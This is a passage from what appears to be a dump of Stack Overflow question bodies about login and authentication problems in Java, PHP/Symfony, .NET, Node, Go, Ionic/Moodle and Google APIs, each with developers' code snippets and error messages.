        assertThat(user.getPassword()).isEqualTo(newPassword);
    }

    @Test
    void shouldConfirmEmail() {
        String value = &quot;email confirmation&quot;;

        authenticationService.confirmEmail(value);

        verify((emailConfirmationTokenService)).confirmToken(value);
    }
}
</code></pre>
<h1>Stack Trace shouldResetPassword()</h1>
<pre><code>java.lang.NullPointerException: Cannot invoke &quot;com.cranker.cranker.user.User.setPassword(String)&quot; because &quot;user&quot; is null

at com.cranker.cranker.authentication.AuthenticationService.resetPassword(AuthenticationService.java:82)
at com.cranker.cranker.unit.authentication.AuthenticationServiceUnitTest.shouldResetPassword(AuthenticationServiceUnitTest.java:97)
at java.base/java.lang.reflect.Method.invoke(Method.java:577)
at java.base/java.util.ArrayList.forEach(ArrayList.java:1511)
at java.base/java.util.ArrayList.forEach(ArrayList.java:1511)
</code></pre>
<h1>Stack trace shouldConfrimEmail()</h1>
<pre><code>Wanted but not invoked:
emailConfirmationTokenService.confirmToken(
    &quot;email confirmation&quot;
);
-&gt; at com.cranker.cranker.token.impl.EmailConfirmationTokenService.confirmToken(EmailConfirmationTokenService.java:30)
Actually, there were zero interactions with this mock.

Wanted but not invoked:
emailConfirmationTokenService.confirmToken(
    &quot;email confirmation&quot;
);
-&gt; at com.cranker.cranker.token.impl.EmailConfirmationTokenService.confirmToken(EmailConfirmationTokenService.java:30)
Actually, there were zero interactions with this mock.

</code></pre>
"
"<p>I'm trying to write a script in order to notify all active users in my host when somebody logs in.</p>
<p>For this I'm creating a script in /etc/profile.d/login_notify.sh
For testing purposes I'm just trying to write to some ttys with something like this:</p>
<p><code>echo &quot;Somebody loged in..&quot; &gt; /dev/pts/0</code></p>
<p>It works when running like root, but not when used by a normal user (it needs to be able to be run by any possible user who logs in to the system). So, I gave the script the g+s setgid like this:</p>
<p><a href=""https://i.stack.imgur.com/Vu3a6.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Vu3a6.png"" alt=""getid permissions"" /></a></p>
<p>Also, the group for the script is tty (like the &quot;write&quot; command is), so that it have permissions to write to the tty and pts files (I guess).</p>
<p>But for some reason, the script is not able to do it's job. I get some permissions errors, and nothing is writen to the ttys or pts:</p>
<p><a href=""https://i.stack.imgur.com/o639v.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/o639v.png"" alt=""error"" /></a></p>
<p>Please, could anybody try to help me with this approach?</p>
<p>If you know any other way for the system to let me know if somebody logs in, at the momento, and  using the terminal, please, let me know.</p>
<p>Thanks a lot in advance</p>
<hr />
<p>I tried using setgid
Also using the write program, but it's difficult for me to write to all the active ttys or pts, and all the active users in the sistem in that moment</p>
<p>I'm expecting my script to be able to write to all the active user's terminals (ttys or pts) something like that:
'the user $user has just loged to the system using the ip $ip and tty $tty, at $date'</p>
"
"<p>Following <a href=""https://book.cakephp.org/authentication/3/en/index.html"" rel=""nofollow noreferrer"">the CakePHP authentication quick start guide</a>, it ends with</p>
<blockquote>
<p>You should now be able to go to /users/add and register a new user.</p>
</blockquote>
<p>When I go to that URL, it says</p>
<blockquote>
<p>The view for UsersController::add() was not found.</p>
</blockquote>
<p>Did I miss something or did the quick start guide never create it?</p>
"
"<p>I have a Symfony 7 project where I'm implementing custom authentication logic for the login route (/api/login). I have a login method in my controller that handles user login and generates a token based on the provided name. Additionally, I've created a custom AuthenticationListener class that implements AuthenticatorInterface to handle authentication for other routes.</p>
<p>Here's a summary of the relevant code:</p>
<pre><code>&lt;?php

namespace App\EventListener;

use Symfony\Component\EventDispatcher\Attribute\AsEventListener;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Event\RequestEvent;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Http\Authenticator\AuthenticatorInterface;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;



class AuthenticationListener implements AuthenticatorInterface
{

    public function supports(Request $request): ?bool
    {
        $route = $request-&gt;attributes-&gt;get('_route');
        return str_starts_with($route, 'api_');
    }

    #[AsEventListener(event: 'kernel.request')]
    public function authenticate(RequestEvent|Request $event): Passport
    {
        $request = $event-&gt;getRequest();

        // Check if the request is for the login route
        if ($request-&gt;attributes-&gt;get('_route') === 'login') {

            return new Passport();
        }


        if (!$request-&gt;headers-&gt;has('Authorization')) {
            throw new UnauthorizedHttpException('Unauthorized', 'Authorization header is missing');
        }

        $key = $request-&gt;headers-&gt;get('Authorization');

        if (!$key) {
            throw new UnauthorizedHttpException('Unauthorized', 'Authorization header is missing');
        }

        $decryptedName = $this-&gt;decrypt($key);

        if (!$decryptedName) {
            throw new UnauthorizedHttpException('Unauthorized', 'Invalid or expired token');
        }

        // Create a UserBadge for other routes
        $userBadge = new UserBadge($decryptedName, function ($username) {
            return null;
        });

        return new Passport($userBadge);
    }


    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return new Response('Authenticated Successfully', Response::HTTP_OK);
    }


    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
        return new Response('Unauthorized', Response::HTTP_UNAUTHORIZED);
    }

    private function decrypt($string): string
    {
        // Decrypt the authorization token using your decryption method
        $secret_key = $_ENV['APP_SECRET']; // Ensure you have APP_KEY set in your environment variables
        $key = openssl_digest($secret_key, 'SHA256', TRUE);
        $c = base64_decode($string);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = substr($c, 0, $ivlen);
        $hmac = substr($c, $ivlen, $sha2len = 32);
        $ciphertext_raw = substr($c, $ivlen + $sha2len);
        $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        //        dd($original_plaintext);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, true);
        if (hash_equals($hmac, $calcmac)) {
            return $original_plaintext;
        }
        return ''; // Return an empty string if decryption fails
    }


    public function createToken(Passport $passport, string $firewallName): TokenInterface
    {
        throw new \LogicException('This method should not be called for stateless authentication.');
    }
}

</code></pre>
<pre><code>class UserController extends AbstractController
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this-&gt;entityManager = $entityManager;
    }


    #[Route('/api/login', name: 'login', methods: ['POST'])]
    public function login(Request $request): JsonResponse
    {
        // Retrieve the request data
        $requestData = json_decode($request-&gt;getContent(), true);

        // Ensure the required fields are provided
        if (!isset($requestData['name'])) {
            return new JsonResponse(['error' =&gt; 'Name field is required'], Response::HTTP_BAD_REQUEST);
        }

        $name = $requestData['name'];

        // Encrypt the name
        $encryptedName = $this-&gt;encrypt($name);

        // Generate a token based on the encrypted name
        $token = $this-&gt;generateToken($encryptedName);

        // Return the token to the client
        return new JsonResponse(['token' =&gt; $token]);
    }

    private function encrypt(string $name): string
    {
        $secretKey = $_ENV['APP_SECRET'];
        $key = openssl_digest($secretKey, 'SHA256', TRUE);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $ciphertextRaw = openssl_encrypt($name, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac('sha256', $ciphertextRaw, $key, true);
        $output = base64_encode($iv . $hmac . $ciphertextRaw);

        return $output;
    }

    private function generateToken(string $encryptedName): string
    {
        // Generate a token based on the encrypted name
        return hash('sha256', $encryptedName);
    }
</code></pre>
<p>Despite my efforts, I'm encountering challenges bypassing authentication for the login route and ensuring proper authentication for other routes. I've experimented with different configurations, but I keep receiving errors related to missing or invalid authorization headers.</p>
<p>Could someone provide guidance on how to correctly implement custom authentication logic for the login route while ensuring authentication for other routes remains intact? Any insights, code examples, or configuration suggestions would be greatly appreciated. Thank you!</p>
<pre><code>security:
password_hashers:
    Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
firewalls:
    dev:
        pattern: ^/(_(profiler|wdt)|css|images|js)/
        security: false
    main:
        lazy: true
        stateless: true
        custom_authenticators:
            - App\EventListener\AuthenticationListener
    api_login:
        pattern: ^/api/login
        stateless: true

access_control:
    - { path: '^/api/login', roles: PUBLIC_ACCESS }
    - { path: '^/', roles: IS_AUTHENTICATED_FULLY }
</code></pre>
<p><strong>update</strong>
I have updated the security.yml and customauthenticator.php but I receive this error &quot;   &quot;title&quot;: &quot;An error occurred&quot;,
&quot;status&quot;: 401,
&quot;detail&quot;: &quot;Full authentication is required to access this resource.&quot;,
&quot;class&quot;: &quot;Symfony\Component\HttpKernel\Exception\HttpException&quot;,:</p>
<pre><code>security:
    password_hashers:
        Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            stateless: true
            custom_authenticators:
                - App\Security\CustomAuthenticator
        api_login:
            pattern: ^/api/login
            stateless: false # Change stateless to false for stateful authentication

    access_control:
        - { path: '^/api/login', roles: PUBLIC_ACCESS }
        - { path: '^/', roles: [ROLE_USER, ROLE_COMPANY_ADMIN, ROLE_SUPER_ADMIN] }
</code></pre>
<pre><code>&lt;?php

namespace App\Security;

use Doctrine\ORM\EntityManagerInterface;
use Exception;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Core\User\UserInterface;
use Symfony\Component\Security\Http\Authenticator\AuthenticatorInterface;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;

use App\Entity\User; // Assuming your User entity is in the App\Entity namespace

class CustomAuthenticator implements AuthenticatorInterface
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this-&gt;entityManager = $entityManager;
    }

    public function supports(Request $request): ?bool
    {
        return $request-&gt;isMethod(Request::METHOD_POST)
            &amp;&amp; $request-&gt;getRequestUri() === '/api/login';
    }

    public function authenticate(Request $request): Passport
    {
        $requestData = json_decode($request-&gt;getContent(), true);
        if (!isset($requestData['name'])) {
            throw new UnauthorizedHttpException('Invalid credentials', 'Required field &quot;name&quot; is missing');
        }

        $name = $requestData['name'];

        try {
            $decryptedName = $this-&gt;decrypt($name);
        } catch (Exception $e) {
            throw new UnauthorizedHttpException('Invalid credentials', 'Invalid or tampered token');
        }

        $user = $this-&gt;loadUser($decryptedName);

        $userBadge = new UserBadge($decryptedName, function ($name) {
            return $this-&gt;loadUser($name);
        });

        return new Passport($userBadge);
    }

    private function loadUser(string $name): ?UserInterface
    {
        return $this-&gt;entityManager-&gt;getRepository(User::class)-&gt;findOneBy(['name' =&gt; $name]);
    }

    private function decrypt($string): string
    {
        // Decrypt the authorization token using your decryption method
        $secret_key = $_ENV['APP_SECRET']; // Ensure you have APP_KEY set in your environment variables
        $key = openssl_digest($secret_key, 'SHA256', TRUE);
        $c = base64_decode($string);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = substr($c, 0, $ivlen);
        $hmac = substr($c, $ivlen, $sha2len = 32);
        $ciphertext_raw = substr($c, $ivlen + $sha2len);
        $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        //        dd($original_plaintext);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, true);
        if (hash_equals($hmac, $calcmac)) {
            return $original_plaintext;
        }
        return ''; // Return an empty string if decryption fails
    }


    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return new Response('Authenticated Successfully', Response::HTTP_OK);
    }

    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
        return new Response('Unauthorized', Response::HTTP_UNAUTHORIZED);
    }

    public function createToken(Passport $passport, string $firewallName): TokenInterface
    {
        throw new \LogicException('This method should not be called for stateless authentication.');
    }
}
</code></pre>
"
"<p>i would like to make a own Login + Register in .net.</p>
<p>The Register should hash the password and also add salt to it.</p>
<p>How could i make this without using identity?</p>
<ul>
<li>It should hash a password in the register</li>
<li>it should be possible to verify user , using the same hashing method</li>
<li>and extra Salt should be used</li>
</ul>
"
"<p>I don't know how to implement this problem.
This is my Login logic:</p>
<pre><code>[Inject]
protected NavigationManager NavigationManager { get; set; }

protected async Task HandleSubmit()
{
    Boolean success = await databaseclient.AuthenticateUserAsync(Email, Password);

    if (success)
    {
        NavigationManager.NavigateTo(&quot;/startseite&quot;);
    } else
    {
        ErrorMessage = &quot;Authentication failed. Please check your credentials.&quot;;
    }

}
</code></pre>
<p>I have tried several things with the AuthenticationStateProvider, but nothing really worked.</p>
"
"<p>I have filled in the required infomation in the kerberos node (eg. SPN, Keytab file path and then trusted realms as well )</p>
<p>I am not getting any prompt to enter the user details. also
In AM log file I see &quot;HTTP-Auth-failed&quot; !!
<a href=""https://i.stack.imgur.com/OFJyo.png"" rel=""nofollow noreferrer"">AM WARNING LOG</a>
<a href=""https://i.stack.imgur.com/z0AsY.png"" rel=""nofollow noreferrer"">NODE SPECIFICATIONS</a></p>
<p>NOTE: My domain controller and my AM is on the same VM. I am using a different user (demo1) in my AD while testing the flow for the kerberos with other service account (serviceuser1)</p>
<p>what might be the issue in this case ?</p>
<p>I tried replacing keytab file path in different location where the AM can read it.</p>
<p>I even tried to change the browser from firefox to edge .</p>
"
"<p>I often use services that log in using information from platforms such as Google, Facebook, and Apple. By logging in using this method, users can obtain user information and use services that require authentication without separate authentication or membership registration.</p>
<p>I am curious about how user information is stored in db in this case.
When saving to the db, a unique id (column containing unique values) is required.
The problem is, unlike when using my own login, I don't know what to use to set the unique value. In the service's own login, the user's uniqueness can be obtained through email authentication or userId.</p>
<p>What I want is to use the unique value of the db to prevent account information from colliding with other users and to prevent duplicate user creation even after user information is changed in any oauth2-provided platform.</p>
<p>Is this possible? What method do you use?</p>
<p>I'm thinking of creating a unique identifier with platform + identifier like google(platform user info id or ...).</p>
"
"<p>I have an API written in Golang and a client in C#, they work with <code>Bearer</code> token, on the client I add the <code>Authorization</code> header but on the server side it is blank.</p>
<p>This is the client C#:</p>
<pre class=""lang-cs prettyprint-override""><code> HttpWebRequest request = (HttpWebRequest)WebRequest.Create(myUrl);
 //request.PreAuthenticate = true;
 request.ContentType = &quot;application/json&quot;;
 request.Method = &quot;PUT&quot;;
 request.Headers.Add(&quot;Authorization&quot;, $&quot;Bearer {token}&quot;);
 //request.Accept = &quot;application/json&quot;;

 using (StreamWriter stream = new StreamWriter(request.GetRequestStream()))
 {
     string serialized = JsonConvert.SerializeObject(sync, new IsoDateTimeConverter() { DateTimeFormat = &quot;yyyy-MM-dd&quot; });
     stream.Write(serialized);
 }

 try
 {
     using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
     {
         if (((int)response.StatusCode) &lt; 200 || ((int)response.StatusCode) &gt;= 300)
         {
             throw new Exception(&quot;error&quot;);
         }
     }
 }
 catch (WebException wex)
 {
     var body = new StreamReader(wex.Response.GetResponseStream()).ReadToEnd();
     throw new HttpRequestException(body);
 }
</code></pre>
<p>Debugging it, the token is present.</p>
<p>This is the golang server code:</p>
<pre class=""lang-golang prettyprint-override""><code>
return func(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        ctx := r.Context()
        authHeader := r.Header.Get(&quot;Authorization&quot;)

        _, err := parseAuthHeader(ctx, verifier, authHeader)
        if err != nil {
            render.Render(w, r, httperr.ErrUnauthorized(err.Error()))
            return
        }
        next.ServeHTTP(w, r)
    })
}
</code></pre>
<p>The variable <code>authHeader</code> is blank, but only in production (Google Cloud). If I run it locally, it works. Already tried to add <code>PreAuthenticate</code>, did not help. Any idea?</p>
"
"<p>I am at a point again where I need to reconsider my approach for authenticating users to my iFrame.</p>
<p>So let me give some context. I have a chatbot service, this service is meant to be embedded into my user's website. Therefore I need an identifier for that user, so that I can load the chatbot's iFrame with the necessary data for my user, creating a session under the name of my user for the enduser using the chatbot.</p>
<p>And so I wend on to build a server to server authentication method, in which The user's backend would communicate with mine using an API-Key with https to securely issue these sessions to the enduser to start talking with the chatbot. The server to server method is awesome for security, as this means as long as my user is the only one in possession of his api key, then only that user is able to initiate a chatbot session using his data, as well as incrementing his usage meters.</p>
<p>But this resulted in increased complexity and also came at the expense of user experience. The Server to Server approach requires the iFrame to support a multitude of backend infrastructure. So for example wix requires using http functions. There are backends that work with python on flask, others with nodejs. This Server to Server method requires the user to also make an endpoint on his server, which is something I would rather avoid, but I am not sure if requiring new endpoints from your user is normal or standard or not.</p>
<p>And then I had to go reevaluating to the frontend approach. So I use Firebase, a google service for managing login and authentication of users. Firebase also uses frontend authentication, where my credentials are stored on the frontend. This should work because google uses domain whitelisting and other various security measures. (Am I stupid for leaving my firebase credentials on frontend???? or does this make sense xD)</p>
<p>And so I thought I could also use a similar identifier for my user. He would then whitelist his website's domain allowing that identifier to only be accessed from that whitelisted website. The question now, is this a secure approach??? what can I also use as security measures? Can't someone impersonate the user's domain let's say myuserA.com and call the chatbot's IFrame from his fake website? Due to the identifier now being in the frontend. If someone were able to impersonate my user's domain, what use would that bring him? Let's say the impersonator works on music, whereas myuserA works on sport. The IFrame would still always answer with the data for sports from myuserA. It would act like free marketing to myuserA, still would cost more money tho, but still it effectively advertises myuserA's products and services. How realistic are these risks? Is the extra work for making the IFrame able to support multiple backend infrastructures a better approach? What else can I do to make the frontend approach more secure? As that approach seems quite simpler and user-friendly.</p>
<p>Notes:</p>
<p>The Chatbot's IFrame only has access to PUBLIC data already available online.
The session is going to be issued in form of a jwt, which are short lived and regulated by the server.
Thank you for reading this :D. I am still inexperienced in these aspects but I am willing to learn more about it.</p>
"
"<p>I've got two entites - User and Manager.</p>
<p><strong>MANAGER</strong></p>
<pre><code>public class Manager extends BaseEntity implements UserDetails {

    private String email;
    private String password;

    private String firstName;
    private String lastName;

    private String position;
    private String avatar;

    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
            name = &quot;manager_authorities&quot;,
            joinColumns = @JoinColumn(name = &quot;manager_id&quot;),
            inverseJoinColumns = @JoinColumn(name = &quot;authority_id&quot;))
    private List&lt;Authority&gt; authorities;

    private boolean isEnabled;

    @Enumerated(EnumType.STRING)
    private AdminType adminType;

    @OneToMany(mappedBy = &quot;manager&quot;)
    private List&lt;EventRequest&gt; eventRequests;

    @Override
    public String getUsername() {
        return email;
    }

    @Override
    public boolean isAccountNonExpired()
    {
        return true;
    }

    @Override
    public boolean isAccountNonLocked()
    {
        return true;
    }

    @Override
    public boolean isCredentialsNonExpired()
    {
        return true;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        Manager manager = (Manager) o;
        return Objects.equals(email, manager.email) &amp;&amp; Objects.equals(password, manager.password);
    }

    @Override
    public int hashCode() {
        return Objects.hash(email, password);}
</code></pre>
<p><strong>USER</strong></p>
<pre><code>@Entity
@Builder
@Getter @Setter
@NoArgsConstructor
@AllArgsConstructor
@Table(name = &quot;users&quot;)
public class User extends BaseEntity implements UserDetails {

    private String email;
    private String password;

    private String firstName;
    private String lastName;

    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
            name = &quot;user_authorities&quot;,
            joinColumns = @JoinColumn(name = &quot;user_id&quot;),
            inverseJoinColumns = @JoinColumn(name = &quot;authority_id&quot;))
    private List&lt;Authority&gt; authorities;

    private boolean isEnabled;

    @Enumerated(EnumType.STRING)
    private UserType userType;

    @Override
    public String getUsername() {
        return email;
    }

    @Override
    public boolean isAccountNonExpired()
    {
        return true;
    }

    @Override
    public boolean isAccountNonLocked()
    {
        return true;
    }

    @Override
    public boolean isCredentialsNonExpired()
    {
        return true;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        User user = (User) o;
        return Objects.equals(email, user.email) &amp;&amp; Objects.equals(password, user.password);
    }

    @Override
    public int hashCode() {
        return Objects.hash(email, password);
    }
}
</code></pre>
<p>Now i don't know to differ them from each other, because they both go throught the same authentication method:</p>
<pre><code>
@Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String username = authentication.getName();
        String password = authentication.getCredentials().toString();

        try {
            UserDetails userDetails = userService.loadUserByUsername(username);

            if (userDetails != null) {
                if (userDetails instanceof Manager) { //this condition always gives false
                    Manager manager = (Manager) userDetails;
                    if (manager.getEmail().equals(username) &amp;&amp; encoder.matches(password, manager.getPassword())) {
                        return new UsernamePasswordAuthenticationToken(manager, null, manager.getAuthorities());
                    }
                } else {
                    User user = (User) userDetails;
                    if (user.getEmail().equals(username) &amp;&amp; user.getPassword().equals(password)) {
                        return new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities());
                    }
                }
            }
        } catch (Exception e) {
            throw new UsernameNotFoundException(&quot;Пользователь с именем пользователя &quot; + username + &quot; не найден&quot;, e);
        }
        return null;
    }
</code></pre>
<p><em><strong>Both of their interfaces implement UserDetailsService</strong></em></p>
<p>}</p>
<p>I tried to get instanceof of class, but IDEA tells that these conditions always gives false value.
I don't know what should i get from credetials to diifer them</p>
"
"<p>I currently have a middle application that goes to certain resource and validate the user/password,</p>
<p>I'm trying to change this validation and make it goes to COGNITO, all examples I have found are badly documented, incomplete and just fragments, or just mentions the redirect from login to aws login and redirect back to your app, as this app lives between others apps, there are no web browser to redirect to,</p>
<p>Is there a way to write a java code to authenticate the user, and receive the token/cookie from some class? I've found there something called Lambda authorizers, but examples are only in phyton and javascript, does this exist in java?</p>
"
"<p>We have an old NodeJS backend generating JWT token when the user signs in. We develop a new C# .NET Core backend. We want to replace the old controller calls with the new one, controller by controller (or method by method if you like). It happens behind the scene, seamlessly.</p>
<p>There can be a situation when the user logs in using the old backend, got a JWT token, then calls a new backend operation, which must accept the JWT token as well. We know the secret of both backend, they can be set to the same, without any problem.</p>
<p>The problem what I see is that setting the same secret is not enough, some different must be, as the nodeJs token is not accepted by the C# side.</p>
<p>The NodeJS code looks like this:</p>
<pre><code>import * as jwt from 'jsonwebtoken';
function signToken(id, role) {
  return jwt.sign(
     { _id: id, role: role }, 
     config.secrets.session, 
     { expiresIn: 60 * 60 * 24 * 7 }
  );
}
</code></pre>
<p>The C# code which verifies the token looks as (<code>Program.cs</code>)</p>
<pre><code>public static IApplicationBuilder UseAuthentication(this IApplicationBuilder app)
{
    app.Properties[AuthenticationMiddlewareSetKey] = true;
    return app.UseMiddleware&lt;AuthenticationMiddleware&gt;();
}

public static IApplicationBuilder UseAuthorization(this IApplicationBuilder app)
{
    VerifyServicesRegistered(app);

    app.Properties[AuthorizationMiddlewareSetKey] = true;
    return app.UseMiddleware&lt;AuthorizationMiddlewareInternal&gt;();
}

public static void ConfigureJwtHandler(this WebApplicationBuilder builder)
{
    var jwtIssuer = builder.Configuration.GetSection(&quot;Jwt:Issuer&quot;).Get&lt;string&gt;();
    var jwtKey = builder.Configuration.GetSection(&quot;Jwt:Key&quot;).Get&lt;string&gt;();

    builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
        .AddJwtBearer(options =&gt;
        {
            options.TokenValidationParameters = new TokenValidationParameters
            {
                ValidateIssuer = false,
                ValidateAudience = false,
                ValidateLifetime = false,
                ValidateIssuerSigningKey = false,
                IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey)),
            };

            options.Authority = &quot;http://localhost:5250&quot;;
            options.RequireHttpsMetadata = false;
        });

    builder.Services.AddAuthorization(options =&gt;
    {
        options.AddPolicy(&quot;myUser&quot;, policy =&gt;
            policy.RequireClaim(&quot;role&quot;));
    });
}

...
var builder = WebApplication.CreateBuilder(args);
builder.ConfigureJwtHandler();
var app = builder.Build();
app.UseAuthentication();
app.UseAuthorization();
app.Run();
</code></pre>
<p>The auth middleware catches the controller call on C# side, because the API controller is flagged with <code>[Authorize]</code>. The error is the following:</p>
<blockquote>
<p>HTTP/1.1 401 Unauthorized</p>
<p>WWW-Authenticate: Bearer error=&quot;invalid_token&quot;, error_description=&quot;The signature key was not found&quot;</p>
</blockquote>
<p>The <code>jwtKey</code> in the C# code and the <code>config.secrets.session</code> is set to the very same string value. The NodeJS requires no <em>issuer</em>, which is set on the C# side.</p>
<p>How to set up the C# code to accept the JWT token generated by the NodeJs backend? Is it possible?</p>
"
"<p>I am implementing a Google sign-in (using HTML/JS) in my ASP.NET webforms application, as follows:</p>
<pre><code>&lt;div id=&quot;authorize&quot;&gt;
    &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;/&gt; // regular sign-in
    &lt;div id=&quot;g_id_onload&quot; 
        data-client_id=&quot;CLIENT_ID.apps.googleusercontent.com&quot;
        data-context: &quot;signup&quot;
        data-ux_mode =&quot;popup&quot;
        data-size=&quot;large&quot;
        data-callback=&quot;handleCredentialResponse&quot;
        data-auto-prompt=&quot;false&quot;&gt;
    &lt;/div&gt;
    &lt;div class=&quot;g_id_signin&quot; 
        data-theme=&quot;filled_blue&quot;
        data-shape=&quot;rectangular&quot;
        data-size=&quot;large&quot;
        data-text=&quot;Sign up with Google&quot;
        data-type=&quot;standard&quot;&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;script&gt; 
    function handleCredentialResponse(response) {
        decodeJwtResponse(response.credential);
    }
    function decodeJwtResponse(data) {
        var jwtPayload = parseJwt(data);
        // console.log(email, emailVerified, familyName, givenName, locale);
    }
    function parseJwt(token) {
        var base64Url = token.split('.')[1];
        var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
        var jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
        return JSON.parse(jsonPayload);
    }
&lt;/script&gt;
</code></pre>
<p>The implementation works, while triggers an automatic popup of the google popup. I am looking for a fix that would trigger the popup only upon the google button press. In addition the google button is auto-filled with my google credentials, is it possible that it would load as instructed - <code>data-text=&quot;Sign up with Google&quot;</code>? Thanks.</p>
"
"<p>Is there a way to create a gcs client with a signed url and then read it?
The canonical way of creating a default client and doing ReadObject() doesn't work for me because
the code can be executed by any service and not all of these services have access to the underlying GCS buckets.
Giving access to these buckets to everyone is not practical and the easiest option for me would be to somehow use the signed URL that we get from upstream service and use that to create GCS client.
The download of signed URL was working fine with curl, but it's too slow and I'm trying to parallelize it but hitting the permission issue with GCS client library.</p>
<pre><code>void download(std::string signedUrl) {
    auto client = gcs::Client::CreateDefaultClient().value();
    // [bucket, object] = extractBucketAndObject(signedUrl);
    auto is = client.ReadObject(
                  bucket, object, gcs::ReadRange(offset, offset + length));
}


</code></pre>
<p>I found online that we can set options for gcs client, e.g.</p>
<pre><code>  auto client = gcs::Client(g::Options{}.set&lt;gcs::RestEndpointOption&gt;(
      &quot;https://storage.googleapis.com&quot;));
</code></pre>
<p>But I don't see an option to pass in the signature/expiry date attributes in options.h</p>
"
"<p>We have a service that is written in spring boot and currently uses kerberos/spnego with keytab to authenticate.
I was trying to replace this with Oauth2 framework and since there is no UI for the API and it is mostly service Id to be authenticated, I am in a dilemma to how to proceed. I read somewhere that I can use JWT. Should I make use of JWT to get the access token? Can someone please show me a direction? Or there any sample examples that I can follow?</p>
<p>Thanks,</p>
<p>pbale</p>
"
"<p>I'm currently working on a Ionic app with a login validation feature. The objective is to verify user-entered login details by cross-referencing them with the corresponding username and password stored in the database. However, I'm faced with the challenge of integrating Moodle for authentication. I have a Moodle site established, and a database is already in place, but I'm uncertain about the most effective approach to tackle this integration. Any guidance or insights would be greatly appreciated.</p>
<p>Here is the code I currently have for the login validation:</p>
<pre><code>import { Component } from '@angular/core';
import { NavController } from '@ionic/angular';

@Component({
  selector: 'app-home',
  templateUrl: 'home.page.html',
  styleUrls: ['home.page.scss'],
})
export class HomePage {
  username!: string;
  password!: string;

  constructor(private navCtrl: NavController) {}

  login() {

    if (this.username === '123' &amp;&amp; this.password === '123') {
      // Navigate to another page after successful login
      this.navCtrl.navigateForward('/home/report-page'); 
    } else {
      // Show an error message for unsuccessful login
      console.log('Invalid username or password');
    }
  }
}
</code></pre>
<p>Update on a new attempt:</p>
<pre><code>login() {
    const moodleEndpoint = 'https://mysite/webservice/rest/server.php';
    const webServiceToken = 'your_web_service_token';

    const params = {
      wstoken: webServiceToken,
      wsfunction: 'core_user_login',
      moodlewsrestformat: 'json',
      username: this.username,
      password: this.password,
    };

    this.http.get(moodleEndpoint, { params }).subscribe(
      (response: any) =&gt; {
        if (response.errorcode) {
          console.log('Login failed. Error: ' + response.errorcode);
        } else {
          // Successful login
          console.log('Login successful');
          // You can navigate to another page or perform other actions here
          this.navCtrl.navigateForward('/home/report-page');
        }
      },
      (error) =&gt; {
        console.error('Login failed. Error: ', error);
      }
    );
  }
}
</code></pre>
<p>I'm not too sure what mooodle webservice I would use tho.</p>
"
"<p>I have this code:</p>
<pre class=""lang-js prettyprint-override""><code>const { google } = require('googleapis');
const fs = require('fs');

// Create an OAuth2 client with the given credentials
const auth = new google.auth.GoogleAuth({
  keyFile: './credentials.json',
  scopes: ['https://www.googleapis.com/auth/drive']
});

// Create a new instance of the Drive API
const drive = google.drive({ version: 'v3', auth });

async function listFolders() {
  try {
    const response = await drive.files.list({
      q: &quot;mimeType='application/vnd.google-apps.folder' and trashed=false&quot;,
      fields: 'files(id, name)',
      orderBy: 'name'
    });

    const folders = response.data.files;
    if (folders.length) {
      console.log('Folders:');
